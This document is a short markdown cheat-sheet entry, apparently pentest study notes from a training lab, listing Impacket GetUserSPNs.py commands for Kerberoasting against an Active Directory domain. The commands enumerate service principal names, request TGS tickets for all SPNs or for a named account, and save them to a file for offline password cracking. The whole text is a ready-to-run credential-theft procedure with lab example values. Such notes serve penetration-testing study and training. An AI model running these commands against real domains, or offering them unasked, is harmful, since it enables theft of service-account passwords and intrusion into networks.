### Kerberoasting
```bash
# List available SPNs for specified user
GetUserSPNs.py -dc-ip <dc ip> <domain>/<user> # will ask for password
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Request TGS tickets for all SPNs available
GetUserSPNs.py -dc-ip <dc ip> <domain>/<user> -request
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

# Request TGS ticket for specific SPN
GetUserSPNs.py -dc-ip <dc ip> <domain>/<user> -request-user <spn>
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

# output TGS Ticket to file for cracking
GetUserSPNs.py -dc-ip <dc ip> <domain>/<user> -request-user sqldev -outputfile <filename>
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

^d1421f

